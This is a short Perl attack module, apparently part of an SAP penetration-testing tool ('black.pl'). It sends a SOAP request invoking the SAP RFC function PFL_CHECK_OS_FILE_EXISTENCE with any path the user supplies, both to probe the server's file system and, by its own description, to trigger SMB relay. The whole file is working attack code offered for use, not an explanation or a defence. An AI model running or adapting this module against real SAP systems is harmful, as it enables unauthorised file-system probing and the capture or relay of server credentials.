#!/usr/bin/perl
# Module a file existence checker (PFL_CHECK_OS_FILE_EXISTENCE) 

# CONFIG
######################
my $desc ="Check a file existence + SMB Relay (PFL_CHECK_OS_FILE_EXISTENCE) \n\t Usage: black.pl .. .. -m id_module <path>  \n\t A path like this: c:\\boot.ini\n"; 
our $funcName="PFL_CHECK_OS_FILE_EXISTENCE_Func";

######################
push(@descriptions,$desc);
push(@functions,$funcName);
######################


# Special function
######################

sub PFL_CHECK_OS_FILE_EXISTENCE_Func()
{
	
	my $path;
	my $XML='<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:soap="http://schemas.xmlsoap.org/wsdl/soap/"  xmlns:xsd="http://www.w3.org/1999/XMLSchema"  xmlns:xsi="http://www.w3.org/1999/XMLSchema-instance"  xmlns:m0="http://tempuri.org/"  xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/">
     <SOAP-ENV:Header/>
     <SOAP-ENV:Body>
        <PFL_CHECK_OS_FILE_EXISTENCE xmlns="urn:sap-com:document:sap:rfc:functions">
           <FULLY_QUALIFIED_FILENAME></FULLY_QUALIFIED_FILENAME>
           <LONG_FILENAME>%PATH%</LONG_FILENAME>
        </PFL_CHECK_OS_FILE_EXISTENCE>
     </SOAP-ENV:Body>
</SOAP-ENV:Envelope>
	';
	
	
	if ($ARGV[$m_arg_i+1]){
		$path=$ARGV[$m_arg_i+1];
		print $path." - path \n\n";
	} else {
		print "Error. Please, enter path name\n";
		exit;
	}

	$XML=~s/%PATH%/$path/s;
	
	
	#print "$XML\r\n";
	
	my @answers=send_soap($XML,1);

	my $answer=join('', @answers);

	print "$answer\r\n";
	
	print "\n\n";
}